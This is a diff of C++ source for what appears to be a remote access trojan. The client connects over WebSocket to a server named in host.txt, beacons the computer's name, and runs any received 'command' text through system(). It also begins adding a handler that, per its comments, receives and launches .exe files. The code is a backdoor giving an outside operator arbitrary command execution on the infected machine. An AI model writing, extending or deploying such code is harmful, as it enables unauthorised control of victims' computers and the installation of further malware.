@@ -3,11 +3,13 @@
 #include <string>
 #include <ixwebsocket/IXNetSystem.h>
 #include <ixwebsocket/IXWebSocket.h>
-#include <json.hpp>
+#include <nlohmann/json.hpp>
+#include <filesystem>
 
 
 using json = nlohmann::json;
 using namespace std;
+namespace fs = filesystem;
 
 
 #ifdef _WIN32
@@ -16,7 +18,7 @@ using namespace std;
     #include <unistd.h>
 #endif
 
-std::string getComputerName() {
+string getComputerName() {
     char name[256];
 #ifdef _WIN32
     DWORD size = sizeof(name);
@@ -32,11 +34,20 @@ std::string getComputerName() {
 }
 
 
+string getExePath(){
+    char buffer[MAX_PATH];
+    GetModuleFileNameA(NULL,buffer,MAX_PATH);
+    return string(buffer);
+}
+
+
+
 
 int main(){
     string BASE_URL;
 
-    ifstream file("config.txt");
+
+    ifstream file("host.txt");
     if(file){
         getline(file,BASE_URL);
 
@@ -51,7 +62,8 @@ int main(){
 
     ix::initNetSystem();
     ix::WebSocket webSocket;
-    webSocket.setUrl("ws://"+BASE_URL+"/ws"); 
+    webSocket.setUrl(BASE_URL); 
+
 
     
     bool isConnect = false;
@@ -67,6 +79,14 @@ int main(){
                 if(type == "command"){
                     string text = data["text"];
                     system(text.c_str());
+// "type": "file"
+// "text": "start https://"
+                    }
+                if(type == "file"){
+                    string filename = data["filename"];
+// "type": "file"
+// "filename": "".exe
+// "data": 0010101010100101010
                 }
             }
         }
@@ -77,15 +97,22 @@ int main(){
     
     string pc_name = getComputerName();
 
+    json send_data;
+    send_data["name"] = pc_name;
+    
+
     while(true){
         if(isConnect){
-
+          cout << '.';
         }else{
-          webSocket.send(pc_name);  
-          cout << pc_name << endl;
+          webSocket.send(send_data.dump());  
+        //   cout << send_data["key"] << endl;
+          cout << send_data["name"] << endl;
         }
         this_thread::sleep_for(std::chrono::seconds(1));
     }
+    
+    
     webSocket.stop();
     ix::uninitNetSystem();
     return 0;
